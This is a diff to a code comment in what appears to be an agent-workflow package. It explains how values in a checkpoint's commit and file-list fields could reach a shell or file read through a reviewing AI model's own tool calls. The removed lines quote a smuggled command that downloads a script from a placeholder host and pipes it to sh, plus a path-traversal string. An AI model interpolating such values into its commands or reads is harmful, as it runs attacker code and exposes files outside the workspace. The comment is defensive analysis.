@@ -293,8 +293,17 @@ function getBlockedTasks(phase) {
 // build `git diff <commit>~1..<commit>` out of `checkpoint_commit`, and to Read
 // every entry of `files_changed`. Schema validation accepts any string for the
 // first (`schema.js`: "string or null") and any array of strings for the
-// second, so `HEAD; curl http://x/y.sh | sh #` reaches a shell and `../../..`
-// reaches a file read.
+// second.
+//
+// To be precise about the mechanism, because an overstatement here would send
+// the next reader looking in the wrong place: NO CODE IN THIS PACKAGE passes
+// either value to a shell. Every exec site uses execFile with a fixed argv
+// (`utils.js` getGitHead, `tools/verify.js`), and the only code that touches
+// checkpoint_commit stores it. The route is the reviewing MODEL interpolating
+// the value into its own Bash tool call because its prompt told it to — so the
+// `files_changed` half is the likelier of the two to fire, since reading a
+// listed path needs no adversarial step at all, only a path pointing outside
+// the workspace.
 //
 // Telling agents these fields are data (input_provenance) is advisory — it asks
 // a model to decline. Constraining the values is not, so it is the half that
